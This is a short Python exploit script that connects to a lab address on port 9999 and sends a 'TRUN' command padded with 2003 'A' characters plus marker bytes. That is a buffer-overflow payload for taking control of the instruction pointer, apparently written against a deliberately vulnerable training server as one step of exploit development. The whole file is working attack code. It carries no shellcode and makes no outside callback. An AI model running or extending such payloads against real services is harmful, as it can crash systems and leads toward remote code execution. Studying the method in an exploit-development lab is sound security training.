#!/usr/bin/python3

import socket
#2003
payload = "A" * 2003 + "B" * 2 + "C" * 2

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.100.131", 9999))
recv = s.recv(1024)
print(recv.decode())
s.send(("TRUN /.:/" + payload + "\r\n").encode())
r = s.recv(1024)
print(r.decode())
s.close()